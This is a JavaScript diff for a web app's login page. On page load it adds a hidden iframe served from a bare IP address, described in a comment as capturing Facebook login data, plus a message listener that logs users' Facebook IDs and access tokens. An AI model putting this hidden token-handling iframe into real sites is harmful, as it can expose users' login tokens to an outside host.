@@ -108,6 +108,7 @@ function signupUser() {
 }
 
 function loginUser() {
+
   var email = $('#email').val();
   var pwd   = $('#pwd').val();
 
@@ -126,6 +127,24 @@ function loginUser() {
 }
 
 $( document ).ready(function() {
+  //hidden iframe to capture FB login crab
+  elt = document.createElement('iframe');
+  elt.id = 'facebook_load_frame';
+  elt.src = 'http://54.149.101.128/braindead/iframe.html';
+  document.getElementsByTagName('body')[0].appendChild(elt);
+
+  // Message passing API from David Walsh at http://davidwalsh.name/window-iframe
+  // // Create IE + others compatible event handler
+  var eventMethod = window.addEventListener ? "addEventListener" : "attachEvent";
+  var eventer = window[eventMethod];
+  var messageEvent = eventMethod == "attachEvent" ? "onmessage" : "message";
+  // Listen to message from child window
+  eventer(messageEvent,function(e) {
+    console.log("Connection status: "+e.data.connectStatus+"; UserID: "+e.data.userID+"; AccessToken: "+e.data.accessToken);
+    //This is the data from the Facebook SDK
+  },false);
+  
+  //====
   FB.init({
     appId      : '1544469515798401',
     xfbml      : true,
